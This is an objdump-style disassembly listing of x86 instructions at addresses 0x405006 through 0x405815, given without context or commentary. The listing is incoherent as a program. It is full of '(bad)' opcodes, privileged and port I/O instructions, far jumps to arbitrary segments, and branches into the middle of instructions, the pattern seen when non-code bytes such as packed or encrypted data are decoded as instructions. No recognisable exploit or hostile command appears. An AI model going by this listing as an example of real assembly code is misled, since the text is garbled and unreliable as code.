  405006:	ret    0xb20d
  405009:	cmp    eax,0xe82f46e6
  40500e:	shl    al,cl
  405010:	add    DWORD PTR [ecx+edi*1],ebx
  405013:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405014:	mov    ecx,0x101bf376
  405019:	shr    BYTE PTR [edi],1
  40501b:	pop    esi
  40501c:	imul   ebx,esi,0x5d
  40501f:	mov    ds:0x2cd58ed9,al
  405024:	pop    esi
  405025:	mov    edx,0x90c61113
  40502a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40502b:	mov    ebx,0xeec6deff
  405030:	ins    BYTE PTR es:[edi],dx
  405031:	mov    DWORD PTR [esi+0x6ef8728e],edx
  405037:	mov    ds:0x36eb0138,eax
  40503c:	fmul   st,st(1)
  40503e:	in     al,0x14
  405040:	and    ah,BYTE PTR [edx]
  405042:	int3   
  405043:	mov    esp,0xc7c3c38f
  405048:	jp     0x405006
  40504a:	dec    esi
  40504b:	das    
  40504c:	mul    DWORD PTR [edx+0x7327e1ec]
  405052:	or     eax,0xdbff9cf3
  405057:	retf   0xa2fd
  40505a:	pop    es
  40505b:	or     BYTE PTR [ebx],dl
  40505d:	cmp    al,0x91
  40505f:	mov    bl,BYTE PTR [ebx-0x317acfa4]
  405065:	mov    ds:0x21631c77,al
  40506a:	jne    0x404fec
  40506c:	sbb    ebp,DWORD PTR [ebp+ebp*2-0x12]
  405070:	enter  0xb5e5,0xd1
  405074:	push   esp
  405075:	jns    0x40501a
  405077:	mov    bl,0xbb
  405079:	ret    
  40507a:	aas    
  40507b:	fs cmps DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40507e:	imul   edx,DWORD PTR ds:0x8bc908e1,0xe169f8c3
  405088:	xchg   si,ax
  40508a:	jmp    0x7647:0x489f0621
  405091:	arpl   WORD PTR [edx+0x79115b19],dx
  405097:	add    eax,0x5db9cb47
  40509c:	outs   dx,DWORD PTR ds:[esi]
  40509d:	ret    
  40509e:	jo     0x4050a2
  4050a0:	jmp    0x4050e6
  4050a2:	sbb    al,0x60
  4050a4:	or     ebp,DWORD PTR [ebp+0x65709f81]
  4050aa:	cmp    BYTE PTR [ecx-0x667da5ca],dl
  4050b0:	mov    ebp,0x66e8ecd7
  4050b5:	je     0x405064
  4050b7:	fimul  DWORD PTR [edx+0x11daa633]
  4050bd:	fmul   DWORD PTR [esi-0x42]
  4050c0:	dec    edx
  4050c1:	push   ds
  4050c2:	or     eax,0x5a58512f
  4050c7:	sahf   
  4050c8:	adc    eax,0x5e2f48e8
  4050cd:	fdivp  st(7),st
  4050cf:	sub    ecx,DWORD PTR [edi+0x4adcd973]
  4050d5:	inc    esp
  4050d6:	es dec eax
  4050d8:	inc    eax
  4050d9:	jne    0x40513a
  4050db:	push   edi
  4050dc:	pmulhuw mm5,QWORD PTR [edi-0x4f]
  4050e0:	repz jbe 0x4050a5
  4050e3:	mov    al,0x94
  4050e5:	pop    edx
  4050e6:	fwait
  4050e7:	add    BYTE PTR [ebx-0x73],0xa0
  4050eb:	js     0x4050c4
  4050ed:	xchg   DWORD PTR [esi+0x4883b4b9],esp
  4050f3:	mov    ax,0xce2a
  4050f7:	test   eax,0xe1e2ae5f
  4050fc:	mov    eax,ds:0xece1fbaa
  405101:	pop    ss
  405102:	adc    cl,0x18
  405105:	or     eax,0xfcc1fd02
  40510a:	cld    
  40510b:	je     0x405183
  40510d:	test   DWORD PTR [ebx-0xe0cc079],edi
  405113:	sub    al,0x5e
  405115:	lods   al,BYTE PTR ds:[esi]
  405116:	sub    eax,0xe24882e
  40511b:	inc    edi
  40511c:	ret    0xd455
  40511f:	push   0x248ff2f4
  405124:	xchg   ebp,eax
  405125:	outs   dx,BYTE PTR ds:[esi]
  405126:	daa    
  405127:	sbb    BYTE PTR ds:0x1ce917d9,0xa6
  40512e:	dec    ebp
  40512f:	mov    eax,ds:0xc2ea7250
  405134:	jp     0x405141
  405136:	leave  
  405137:	clc    
  405138:	sub    dh,BYTE PTR [ebx+edx*1+0x58]
  40513c:	fs (bad) 
  40513e:	sbb    edi,ebp
  405140:	sbb    ecx,ecx
  405142:	mov    dl,0x26
  405144:	jno    0x405193
  405146:	dec    ebx
  405147:	mov    eax,ds:0xe878f6f
  40514c:	inc    edx
  40514d:	push   es
  40514e:	(bad)  
  40514f:	adc    al,0x7a
  405151:	mov    DWORD PTR [esi],ebp
  405153:	dec    esi
  405154:	jbe    0x4051b5
  405156:	xchg   edi,eax
  405157:	scas   al,BYTE PTR es:[edi]
  405158:	or     eax,0x58f80b8
  40515d:	in     eax,dx
  40515e:	inc    ebp
  40515f:	scas   al,BYTE PTR es:[edi]
  405160:	mov    ss,WORD PTR [edx+0x4732a026]
  405166:	jns    0x405115
  405168:	sub    dh,0x80
  40516b:	repz push ebp
  40516d:	sub    al,0x13
  40516f:	test   al,0x21
  405171:	popf   
  405172:	xchg   edi,eax
  405173:	arpl   dx,si
  405175:	add    eax,0xc08e32bc
  40517a:	daa    
  40517b:	stos   DWORD PTR es:[edi],eax
  40517c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40517d:	rol    DWORD PTR [ebx+0x47b54fe8],0x2d
  405184:	call   0x9458568a
  405189:	test   al,0x69
  40518b:	xor    bh,dh
  40518d:	leave  
  40518e:	(bad)  
  40518f:	mov    ebp,0x855ef739
  405194:	xor    eax,0x1b26656
  405199:	inc    edx
  40519a:	or     esi,esp
  40519c:	pop    eax
  40519d:	(bad)  
  40519e:	push   eax
  40519f:	cmp    al,0x3e
  4051a1:	shr    BYTE PTR [edi+0x1841430e],1
  4051a7:	enter  0xcf63,0x4b
  4051ab:	jno    0x40518d
  4051ad:	push   es
  4051ae:	push   esp
  4051af:	bswap  eax
  4051b1:	pop    ss
  4051b2:	jge    0x405165
  4051b4:	or     dh,bh
  4051b6:	and    eax,0xb3d57cd3
  4051bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051bc:	daa    
  4051bd:	xchg   esi,eax
  4051be:	xor    ebx,DWORD PTR [edx+0x1]
  4051c1:	sbb    al,0x2a
  4051c3:	dec    edx
  4051c4:	les    edx,FWORD PTR [ecx+0xd]
  4051c7:	push   edx
  4051c8:	rcl    BYTE PTR [ebx+0x33],1
  4051cb:	add    ebp,DWORD PTR [ebx+0x78]
  4051ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051cf:	call   0x53c8acf7
  4051d4:	adc    DWORD PTR [ebp+0x1026e5f7],ebp
  4051da:	or     ebp,DWORD PTR [edx]
  4051dc:	dec    edi
  4051dd:	xor    BYTE PTR cs:[ecx-0x31],al
  4051e1:	fsub   st(1),st
  4051e3:	lock retf 
  4051e5:	loopne 0x4051b7
  4051e7:	das    
  4051e8:	jecxz  0x405189
  4051ea:	cli    
  4051eb:	push   edi
  4051ec:	push   ss
  4051ed:	dec    edi
  4051ee:	pop    ecx
  4051ef:	inc    edi
  4051f0:	mov    ebp,0x6a374d7
  4051f5:	out    0xd3,eax
  4051f7:	xor    bl,al
  4051f9:	xor    eax,0x962a3fb6
  4051fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051ff:	xor    esi,DWORD PTR [ecx+0x76]
  405202:	or     DWORD PTR [ecx+0x2e45cab9],eax
  405208:	scas   al,BYTE PTR es:[edi]
  405209:	dec    edi
  40520a:	fdiv   DWORD PTR ds:0xb98a0569
  405210:	(bad)  
  405211:	clc    
  405212:	xor    bl,BYTE PTR [eax+0x5d036d01]
  405218:	pop    esi
  405219:	sub    BYTE PTR [esi-0x76a1b1bd],0xbc
  405220:	(bad)  
  405221:	xor    eax,0x63e788f5
  405226:	sbb    DWORD PTR [ecx-0x372234bc],0x65
  40522d:	sub    esp,DWORD PTR [eax+eax*1+0x55e7bba6]
  405234:	stos   DWORD PTR es:[edi],eax
  405235:	jmp    0x405245
  405237:	mov    ebx,0xf978501b
  40523c:	outs   dx,BYTE PTR ds:[esi]
  40523d:	dec    ebp
  40523e:	fwait
  40523f:	jb     0x40525d
  405241:	push   ebx
  405242:	fwait
  405243:	mov    al,ds:0x23c1cc07
  405248:	ffreep st(6)
  40524a:	cmovno ebx,DWORD PTR ds:0x37a17d2
  405251:	jne    0x4052d2
  405253:	stos   DWORD PTR es:[edi],eax
  405254:	adc    DWORD PTR [ebx+0x42cd582f],0xffffffd4
  40525b:	ins    BYTE PTR es:[edi],dx
  40525c:	mov    esp,DWORD PTR [esi-0x44]
  40525f:	clc    
  405260:	aas    
  405261:	sahf   
  405262:	fist   DWORD PTR [edx-0x12]
  405265:	dec    esp
  405266:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  405268:	imul   edi,DWORD PTR [esp+eiz*2],0xffffffee
  40526c:	and    eax,0x4b85d543
  405271:	push   ss
  405272:	cmp    eax,0xe5011f68
  405277:	repnz mov eax,ds:0xfba105ad
  40527d:	lods   al,BYTE PTR es:[esi]
  40527f:	mov    ch,0x45
  405281:	mov    cl,0x54
  405283:	add    esi,esi
  405285:	addr16 jns 0x4052b4
  405288:	les    esi,FWORD PTR [ebp-0x5cb3d593]
  40528e:	xchg   ebp,eax
  40528f:	and    eax,0xca6f65dd
  405294:	hlt    
  405295:	add    al,0x4d
  405297:	add    ebx,DWORD PTR [eax+0x3c3cb6e6]
  40529d:	mov    ecx,0x60153867
  4052a2:	dec    esp
  4052a3:	pop    ebx
  4052a4:	(bad)  
  4052a5:	pop    esi
  4052a6:	jg     0x40524c
  4052a8:	retf   
  4052a9:	es xchg esi,eax
  4052ab:	jmp    0x32b3df64
  4052b0:	outs   dx,BYTE PTR ds:[esi]
  4052b1:	jno    0x4052a5
  4052b3:	fcom   DWORD PTR [edi-0x1e]
  4052b6:	pop    ebx
  4052b7:	mov    ah,0x8e
  4052b9:	or     ebx,DWORD PTR [ecx-0x2a]
  4052bc:	leave  
  4052bd:	cmp    eax,0x3107daa9
  4052c2:	js     0x40529c
  4052c4:	sbb    eax,0xc4e6b814
  4052c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052ca:	sahf   
  4052cb:	adc    cl,BYTE PTR [esi+0x52]
  4052ce:	or     eax,0xfcc7e958
  4052d3:	sahf   
  4052d4:	sbb    al,0x70
  4052d6:	adc    DWORD PTR [ebx],edx
  4052d8:	adc    ah,bh
  4052da:	(bad)  
  4052db:	push   ss
  4052dc:	cwde   
  4052dd:	retf   0xfe42
  4052e0:	jmp    0x7dbd853e
  4052e5:	push   es
  4052e6:	push   ebx
  4052e7:	mov    cl,0x41
  4052e9:	js     0x4052b5
  4052eb:	loop   0x40534d
  4052ed:	pop    eax
  4052ee:	sbb    esp,edx
  4052f0:	pop    esi
  4052f1:	and    eax,DWORD PTR ds:0xef7438ad
  4052f7:	mov    ds:0x3a9e7544,eax
  4052fc:	mov    edx,0x9bbd7f22
  405301:	loopne 0x40532b
  405303:	mov    eax,ds:0xb07bcd0c
  405308:	sbb    ah,bl
  40530a:	pop    esi
  40530b:	mov    al,0xf7
  40530d:	xor    DWORD PTR ds:0x509139a9,0x4d
  405314:	out    0xcc,eax
  405316:	cld    
  405317:	int    0x4f
  405319:	fwait
  40531a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40531b:	xor    eax,0xbbe04040
  405320:	and    ebx,esp
  405322:	pop    esp
  405323:	stos   BYTE PTR es:[edi],al
  405324:	sbb    ah,BYTE PTR [edi-0x12]
  405327:	pop    edx
  405328:	jp     0x405344
  40532a:	iret   
  40532b:	lahf   
  40532c:	aas    
  40532d:	add    ch,BYTE PTR cs:[esi]
  405330:	and    BYTE PTR [ebp-0x17],ah
  405333:	lahf   
  405334:	jnp    0x40538d
  405336:	pop    ds
  405337:	rol    ah,1
  405339:	mov    cl,0x3b
  40533b:	pop    ss
  40533c:	mov    ds:0x734a4b21,al
  405341:	icebp  
  405342:	jbe    0x405355
  405344:	addr16 je 0x4052f2
  405347:	stos   BYTE PTR es:[edi],al
  405348:	mov    esi,0xe6eb4c1b
  40534d:	mov    ds:0x7a29bfa1,eax
  405352:	(bad)  [edi]
  405354:	sbb    cl,BYTE PTR [eax]
  405356:	adc    bh,BYTE PTR [edx]
  405358:	shl    DWORD PTR [edi-0x54b5db40],cl
  40535e:	loopne 0x40533b
  405360:	cmc    
  405361:	jmp    0x17f76614
  405366:	mov    dl,0xec
  405368:	cmp    ch,ah
  40536a:	sbb    DWORD PTR [ecx-0x6154a761],esi
  405370:	push   ss
  405371:	push   0x68
  405373:	and    al,0x67
  405375:	fld    QWORD PTR [ecx+0x3d789a68]
  40537b:	repz sbb ebp,esi
  40537e:	mov    al,0xab
  405380:	sar    BYTE PTR [ebx+0x5023a00e],cl
  405386:	add    DWORD PTR [ecx-0xe],eax
  405389:	rol    BYTE PTR [ebx],cl
  40538b:	dec    edi
  40538c:	cwde   
  40538d:	aam    0x19
  40538f:	das    
  405390:	pushf  
  405391:	pop    edi
  405392:	into   
  405393:	loopne 0x4053d3
  405395:	cmp    BYTE PTR [esi+ecx*1+0x2451dac3],ch
  40539c:	cmp    BYTE PTR [edx+0x25d0044d],dl
  4053a2:	xchg   esp,eax
  4053a3:	sbb    bl,BYTE PTR [edx-0x1d9e25b2]
  4053a9:	in     eax,dx
  4053aa:	imul   esi,DWORD PTR [ebp+0x284067bc],0xeeb95a32
  4053b4:	jno    0x405336
  4053b6:	scas   al,BYTE PTR es:[edi]
  4053b7:	enter  0xca8a,0xff
  4053bb:	xchg   DWORD PTR [esi+0x32e57bd8],ebx
  4053c1:	push   es
  4053c2:	shr    edi,0x19
  4053c5:	sub    cl,BYTE PTR [edi+ebp*2]
  4053c8:	mov    ah,0x51
  4053ca:	xlat   BYTE PTR ds:[ebx]
  4053cb:	adc    eax,0xf89c6edd
  4053d0:	jmp    0xed7f:0x13c1c068
  4053d7:	outs   dx,BYTE PTR ds:[esi]
  4053d8:	mov    dl,0xaf
  4053da:	loopne 0x40544b
  4053dc:	and    eax,0xa3d4ab7
  4053e1:	jnp    0x405402
  4053e3:	push   0x3133aba
  4053e8:	out    0x7d,al
  4053ea:	call   FWORD PTR [ebx-0x2e]
  4053ed:	and    eax,0xe0bed00b
  4053f2:	push   edx
  4053f3:	cld    
  4053f4:	or     BYTE PTR [edx+ebx*8],0xf0
  4053f8:	and    dl,ch
  4053fa:	(bad)  
  4053fb:	repz leave 
  4053fd:	ss into 
  4053ff:	jne    0x405407
  405401:	sbb    bh,0x5f
  405404:	push   ecx
  405405:	out    dx,al
  405406:	mov    edi,0xd8dbefcf
  40540b:	into   
  40540c:	cwde   
  40540d:	mov    esp,0x69012e56
  405412:	jmp    0x48b:0xfa9c43b5
  405419:	fidiv  WORD PTR [ecx-0x279e7185]
  40541f:	pop    ss
  405420:	sub    esp,DWORD PTR [eax+0x33]
  405423:	jnp    0x40541a
  405425:	mov    bl,ah
  405427:	xchg   ecx,eax
  405428:	ins    DWORD PTR es:[edi],dx
  405429:	icebp  
  40542a:	sub    edi,DWORD PTR [ecx]
  40542c:	mov    ch,0x3b
  40542e:	dec    ebp
  40542f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405430:	shl    ecx,0x1c
  405433:	add    eax,ebx
  405435:	mov    al,ds:0x50f3e94d
  40543a:	(bad)  
  40543b:	mov    dl,0xb8
  40543d:	push   es
  40543e:	xor    cl,dl
  405440:	fs mov bl,0xe7
  405443:	(bad)  
  405445:	cmc    
  405446:	add    DWORD PTR [ebx+0x24],edx
  405449:	shl    BYTE PTR [ebp-0x484cf703],cl
  40544f:	iret   
  405450:	mov    edx,0x9dcacae3
  405455:	push   ebx
  405456:	adc    BYTE PTR [ecx+0x10],cl
  405459:	arpl   si,di
  40545b:	not    BYTE PTR [eax]
  40545d:	push   ds
  40545e:	arpl   WORD PTR ds:0x8ca03dab,di
  405464:	test   ch,ch
  405466:	leave  
  405467:	iret   
  405468:	inc    edx
  405469:	push   ss
  40546a:	in     al,dx
  40546b:	xchg   esi,eax
  40546c:	cmc    
  40546d:	xchg   esi,eax
  40546e:	je     0x4054a7
  405470:	scas   eax,DWORD PTR es:[edi]
  405471:	xor    al,0x32
  405473:	push   ss
  405474:	xchg   ebp,eax
  405475:	dec    eax
  405476:	or     ebp,ebp
  405478:	loope  0x40543e
  40547a:	push   ecx
  40547b:	(bad)  
  40547c:	aad    0xee
  40547e:	(bad)  
  40547f:	cli    
  405480:	mov    eax,ds:0xcc72fcaf
  405485:	repnz cli 
  405487:	pop    esi
  405488:	or     al,0xcf
  40548a:	fdiv   QWORD PTR [edi]
  40548c:	dec    edx
  40548d:	mov    al,BYTE PTR [edx-0x11]
  405490:	scas   al,BYTE PTR es:[edi]
  405491:	scas   eax,DWORD PTR es:[edi]
  405492:	lahf   
  405493:	or     dl,BYTE PTR [ebp-0x55]
  405496:	aam    0xc7
  405498:	xchg   ebp,eax
  405499:	outs   dx,BYTE PTR ds:[esi]
  40549a:	and    al,0xdb
  40549c:	jmp    0x405497
  40549e:	lds    eax,FWORD PTR [esi-0x3a2e9597]
  4054a4:	mov    BYTE PTR [esi-0x38a3ed24],ah
  4054aa:	cli    
  4054ab:	add    ebp,DWORD PTR [ecx+edi*2+0x3b19e068]
  4054b2:	mov    fs:0x820b856b,eax
  4054b8:	loop   0x4054b4
  4054ba:	pop    ebx
  4054bb:	jb     0x405443
  4054bd:	add    eax,0x7425e64b
  4054c2:	sbb    al,0x94
  4054c4:	jns    0x4054a1
  4054c6:	and    eax,0xcacfe516
  4054cb:	jmp    0xaa245e88
  4054d0:	loope  0x405530
  4054d2:	jns    0x40547d
  4054d4:	imul   ebp,eax,0x5bd2b2c1
  4054da:	shl    BYTE PTR [ebx],1
  4054dc:	push   edx
  4054dd:	adc    al,0xf9
  4054df:	lods   eax,DWORD PTR ds:[esi]
  4054e0:	je     0x4054fd
  4054e2:	ss or  al,0xf2
  4054e5:	out    0x59,al
  4054e7:	ret    0x18f7
  4054ea:	inc    edx
  4054eb:	hlt    
  4054ec:	xchg   ebx,eax
  4054ed:	mov    cl,0x88
  4054ef:	lods   eax,DWORD PTR ds:[esi]
  4054f0:	sbb    eax,0x6cd3c48
  4054f5:	popa   
  4054f6:	in     al,0xc4
  4054f8:	das    
  4054f9:	loop   0x405507
  4054fb:	pop    ss
  4054fc:	push   ebx
  4054fd:	cmp    al,0xaf
  4054ff:	lods   al,BYTE PTR ds:[esi]
  405500:	cmp    BYTE PTR [esi+0x6313e0d7],0x75
  405507:	inc    ebp
  405508:	jno    0x4054ad
  40550a:	cmp    DWORD PTR [edx],ebp
  40550c:	inc    eax
  40550d:	ret    
  40550e:	fcomip st,st(0)
  405510:	inc    edi
  405511:	call   0x6add:0x7191892d
  405518:	pop    es
  405519:	rol    ch,0xb3
  40551c:	xchg   edi,eax
  40551d:	adc    ah,dh
  40551f:	not    BYTE PTR [ecx]
  405521:	inc    esi
  405522:	enter  0x4047,0x85
  405526:	jle    0x405577
  405528:	popa   
  405529:	inc    esi
  40552a:	or     DWORD PTR [edx-0x5d],ebp
  40552d:	and    al,0x7e
  40552f:	aad    0x4a
  405531:	add    al,0xb
  405533:	or     ah,BYTE PTR [esi]
  405535:	mov    esp,0x2a1e721
  40553a:	out    0x79,al
  40553c:	rcl    DWORD PTR [edx+0x66fbf4f1],0xac
  405543:	sub    DWORD PTR ds:0x8d33af9a,edx
  405549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40554a:	test   al,0x36
  40554c:	pop    eax
  40554d:	mov    ds:0x9fa1de67,al
  405552:	adc    dl,BYTE PTR [ebp+0x38e6b790]
  405558:	std    
  405559:	jge    0x40550c
  40555b:	repnz dec edx
  40555d:	ins    DWORD PTR es:[edi],dx
  40555e:	cmp    BYTE PTR [ecx],0xa9
  405561:	jo     0x4055c7
  405563:	or     edx,0xd5f8314a
  405569:	xchg   esp,eax
  40556a:	ret    
  40556b:	and    eax,0x4923c5a3
  405570:	xchg   ecx,eax
  405571:	loopne 0x405541
  405573:	mov    eax,ds:0x38993654
  405578:	xchg   DWORD PTR [eax+ebp*2+0x5e8669ed],ebp
  40557f:	das    
  405580:	fcomp  QWORD PTR [ecx+esi*8-0x35]
  405584:	scas   eax,DWORD PTR es:[edi]
  405585:	arpl   WORD PTR [esi+0x18843312],bx
  40558b:	adc    DWORD PTR [ebp-0x46db6995],ecx
  405591:	pushf  
  405592:	sub    BYTE PTR [edx+0x69],al
  405595:	adc    DWORD PTR [edi+edx*8],ebx
  405598:	xchg   ebp,eax
  405599:	adc    DWORD PTR [ebx+0x19],0x70
  40559d:	and    eax,0x867e40b6
  4055a2:	arpl   bx,dx
  4055a4:	or     eax,0x75683f74
  4055a9:	(bad)  
  4055aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055ab:	mov    eax,0x364b50a1
  4055b0:	fwait
  4055b1:	xor    dl,BYTE PTR [esi]
  4055b3:	dec    edx
  4055b4:	and    eax,0x7baf8ce
  4055b9:	fsin   
  4055bb:	int    0x50
  4055bd:	add    ecx,edi
  4055bf:	je     0x4055ab
  4055c1:	ja     0x405566
  4055c3:	jo     0x40558a
  4055c5:	mov    edi,ds
  4055c7:	stc    
  4055c8:	(bad)  
  4055c9:	gs inc edi
  4055cb:	pop    es
  4055cc:	(bad)  
  4055cd:	jmp    0xfba9b5ea
  4055d2:	test   al,0x2f
  4055d4:	pop    ebp
  4055d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055d6:	mov    ecx,0x604c180c
  4055db:	inc    eax
  4055dc:	stc    
  4055dd:	arpl   WORD PTR [ebx+0x5f],bp
  4055e0:	mov    bl,0xac
  4055e2:	in     eax,dx
  4055e3:	shl    BYTE PTR [ebx+0x5d8b35e9],1
  4055e9:	int3   
  4055ea:	fwait
  4055eb:	loop   0x4055cc
  4055ed:	and    BYTE PTR [ebx-0x73ef32f6],0xd5
  4055f4:	or     ecx,DWORD PTR [esi+edx*2]
  4055f7:	iret   
  4055f8:	xor    DWORD PTR [ebx-0x5a153a5b],ecx
  4055fe:	inc    esi
  4055ff:	int    0x9
  405601:	xchg   ebx,eax
  405602:	xor    eax,0xc4108d1e
  405607:	(bad)  
  405608:	adc    al,BYTE PTR [edi-0xf]
  40560b:	mov    al,ds:0x5065d48f
  405610:	sub    DWORD PTR [esi+0x2b25b452],0xc
  405617:	inc    ebx
  405618:	sub    ebx,DWORD PTR [ecx-0x70]
  40561b:	mov    esi,0xf3293215
  405620:	dec    eax
  405621:	xor    eax,DWORD PTR [eax+0x693c0133]
  405627:	push   esp
  405628:	stos   BYTE PTR es:[edi],al
  405629:	dec    ecx
  40562a:	aaa    
  40562b:	and    al,0xb8
  40562d:	sbb    BYTE PTR [edx-0x70],al
  405630:	mov    esp,ecx
  405632:	test   al,0xac
  405634:	mov    edi,ebp
  405636:	aam    0x6d
  405638:	pop    ebp
  405639:	je     0x4056b3
  40563b:	das    
  40563c:	xor    esi,eax
  40563e:	mov    ebx,0x82093d58
  405643:	jo     0x405648
  405645:	cmp    eax,0xb9ca0b38
  40564a:	mov    ebx,0x1a494335
  40564f:	sahf   
  405650:	ja     0x405622
  405652:	pop    eax
  405653:	fucom  st(1)
  405655:	fwait
  405656:	in     al,0xe4
  405658:	adc    DWORD PTR [ebx-0x7957b292],0x15be5727
  405662:	js     0x405641
  405664:	inc    esp
  405665:	loopne 0x4056af
  405667:	mov    DWORD PTR [edx+0x12],esi
  40566a:	jmp    FWORD PTR [esp+ebx*4+0x39]
  40566e:	aas    
  40566f:	mov    WORD PTR [eax],es
  405671:	cmp    al,0x39
  405673:	ja     0x405693
  405675:	sub    al,0x19
  405677:	into   
  405678:	dec    ebp
  405679:	jo     0x4056e7
  40567b:	cs jnp 0x405631
  40567e:	mov    ?,WORD PTR [esp+ebx*2]
  405681:	pusha  
  405682:	loopne 0x4056db
  405684:	mov    ecx,ecx
  405686:	into   
  405687:	mov    ds:0xf005f508,al
  40568c:	jp     0x405622
  40568e:	push   0x7e840917
  405693:	jmp    0xf942:0x40a16498
  40569a:	cmp    dl,ah
  40569c:	fimul  WORD PTR [eax+ebx*1]
  40569f:	fsub   DWORD PTR [ebx]
  4056a1:	xor    BYTE PTR [ecx-0x1a],0xd2
  4056a5:	scas   eax,DWORD PTR es:[edi]
  4056a6:	fld    TBYTE PTR ds:0xc1e16fc6
  4056ac:	pop    ds
  4056ad:	pushf  
  4056ae:	ins    DWORD PTR es:[edi],dx
  4056af:	fcom   QWORD PTR ds:0xaf8fc12e
  4056b5:	mov    ds:0xaa280e5d,eax
  4056ba:	inc    eax
  4056bb:	ret    
  4056bc:	fcomip st,st(2)
  4056be:	mov    ecx,gs
  4056c0:	cdq    
  4056c1:	mov    ch,0xa9
  4056c3:	bound  ebx,QWORD PTR [edi+0x61]
  4056c6:	adc    al,0xa
  4056c8:	mov    edx,0x8dd56b62
  4056cd:	les    edi,FWORD PTR [edx]
  4056cf:	imul   ecx,DWORD PTR [edx+0x4b655924],0x9acd83c9
  4056d9:	inc    ebp
  4056da:	clc    
  4056db:	cmc    
  4056dc:	sbb    DWORD PTR [ebp-0x1c],ebx
  4056df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056e0:	mov    ebx,ecx
  4056e2:	mov    bh,0xc4
  4056e4:	mov    al,0x2c
  4056e6:	out    dx,eax
  4056e7:	sbb    bh,BYTE PTR [ecx+0x6e]
  4056ea:	retf   0xe5b9
  4056ed:	out    0xd4,eax
  4056ef:	or     DWORD PTR [ebp-0x3b],esi
  4056f2:	push   0x2db0427c
  4056f7:	mov    dl,0x64
  4056f9:	cmp    BYTE PTR [esi-0x2ce82816],bh
  4056ff:	mov    ebx,0x8e6e9d86
  405704:	addr16 jae 0x4056d8
  405707:	lods   eax,DWORD PTR ds:[esi]
  405708:	repnz pop ebp
  40570a:	pop    ss
  40570b:	push   ebx
  40570c:	loop   0x40570c
  40570e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40570f:	popf   
  405710:	not    DWORD PTR ds:0x37370ec9
  405716:	out    dx,eax
  405717:	gs pop esp
  405719:	adc    BYTE PTR [ecx],dl
  40571b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40571c:	ret    
  40571d:	dec    ecx
  40571e:	cmp    DWORD PTR [ebx+0x1f],esi
  405721:	and    eax,0xfe1b8df2
  405726:	imul   edi,DWORD PTR [ecx+edi*1-0x38],0x8c58a761
  40572e:	sbb    dh,cl
  405730:	int3   
  405731:	sbb    ecx,eax
  405733:	gs jno 0x40571b
  405736:	arpl   dx,ax
  405738:	mov    al,0xcc
  40573a:	ja     0x405714
  40573c:	xchg   BYTE PTR [edi+0x27a140b],cl
  405742:	jno    0x4056f1
  405744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405745:	and    eax,0xe42ffcf4
  40574a:	dec    edx
  40574b:	ror    BYTE PTR [esi],cl
  40574d:	fdiv   st(5),st
  40574f:	or     eax,0x8b7447f9
  405754:	sbb    dl,BYTE PTR [edx-0x65]
  405757:	cmp    al,0x5c
  405759:	push   eax
  40575a:	xlat   BYTE PTR ds:[ebx]
  40575b:	jge    0x40575a
  40575d:	fmul   DWORD PTR [eax+eiz*8]
  405760:	inc    ebp
  405761:	cld    
  405762:	mov    al,ds:0x9c28e304
  405767:	sbb    DWORD PTR [ebp+0x41],0x4c6e82f7
  40576e:	les    esi,FWORD PTR [bp+si-0x80]
  405772:	pop    es
  405773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405774:	(bad)  
  405775:	sub    esp,edx
  405777:	adc    cl,al
  405779:	fcom   DWORD PTR [ebx+0x7d]
  40577c:	popf   
  40577d:	xlat   BYTE PTR ds:[ebx]
  40577e:	outs   dx,DWORD PTR ds:[esi]
  40577f:	fldenv [ebx-0x10]
  405782:	jmp    0x40574c
  405784:	mov    ecx,0xe081f2c2
  405789:	mov    eax,0xa05f511b
  40578e:	mov    eax,ds:0xfe84fcab
  405793:	mov    ds:0xb2c7cbfe,eax
  405798:	lock cli 
  40579a:	or     edi,DWORD PTR [ecx-0x31]
  40579d:	xor    DWORD PTR [edx+0x4666d23],0x37
  4057a4:	or     al,0x1
  4057a6:	test   BYTE PTR [esi-0x41],ch
  4057a9:	aad    0xc7
  4057ab:	icebp  
  4057ac:	jmp    0xfe40c090
  4057b1:	shl    DWORD PTR es:[edi-0x1d7db22e],1
  4057b8:	mov    al,0x3b
  4057ba:	or     edx,esi
  4057bc:	jo     0x40580c
  4057be:	cmp    DWORD PTR [ebp+0x59772089],ebx
  4057c4:	dec    eax
  4057c5:	nop
  4057c6:	lock test BYTE PTR [edx-0x18],ah
  4057ca:	xor    eax,0xa258a7f9
  4057cf:	pop    esp
  4057d0:	push   ss
  4057d1:	arpl   WORD PTR [ecx],dx
  4057d3:	xor    ah,BYTE PTR ds:0xeb99cb93
  4057d9:	mov    ch,0x95
  4057db:	push   0xffffffeb
  4057dd:	pop    edx
  4057de:	(bad)  
  4057df:	fidiv  DWORD PTR ds:0x46ce4231
  4057e5:	jmp    0x97975e36
  4057ea:	loopne 0x40585a
  4057ec:	mov    cl,0x9a
  4057ee:	pop    edi
  4057ef:	repz ror DWORD PTR [eax],0x1e
  4057f3:	xchg   ah,ch
  4057f5:	xor    BYTE PTR [esi-0x12],cl
  4057f8:	sbb    al,BYTE PTR [esi+0xf0e8ab1]
  4057fe:	jg     0x405853
  405800:	cld    
  405801:	xchg   ecx,eax
  405802:	mov    bl,0x42
  405804:	adc    eax,0xe01d97f
  405809:	into   
  40580a:	mov    al,0x3c
  40580c:	add    al,0x25
  40580e:	sbb    DWORD PTR [ecx+0x59],edi
  405811:	jge    0x40586a
  405813:	loopne 0x405829
  405815:	sub    eax,0x5786c41a
